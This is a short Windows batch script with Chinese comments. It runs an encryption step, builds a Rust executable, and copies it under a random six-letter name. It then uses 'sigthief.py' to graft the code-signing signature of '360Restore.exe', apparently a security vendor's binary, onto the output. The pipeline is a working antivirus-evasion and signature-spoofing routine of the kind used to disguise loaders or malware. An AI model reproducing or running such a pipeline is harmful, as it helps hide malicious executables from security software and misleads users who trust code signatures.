@echo off
setlocal EnableDelayedExpansion

python encrypt.py

//cargo clean

cargo build --release

:: 设置源文件和目标目录
set "sourceFile=target\release\project.exe"
set "targetDir=output"

:: 生成6位随机英文文件名
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
set "randomName="

for /l %%i in (1,1,6) do (
    set /a "randIndex=!random! %% 52"
    for %%j in (!randIndex!) do set "randomName=!randomName!!chars:~%%j,1!"
)

:: 构建目标文件路径
set "targetFile=%targetDir%\!randomName!.exe"

:: 复制文件
copy "%sourceFile%" "%targetFile%"

:: 输出结果
echo Copied and renamed to: "%targetFile%"

:: 设置Python脚本和依赖文件的路径
set "pythonScript=output\sigthief.py"
set "restoreExe=output\360Restore.exe"
set "outputExe=%targetFile%_sign.exe"

:: 运行 Python 脚本
python "%pythonScript%" -t "%targetFile%" -i "%restoreExe%" -o "%outputExe%"

endlocal
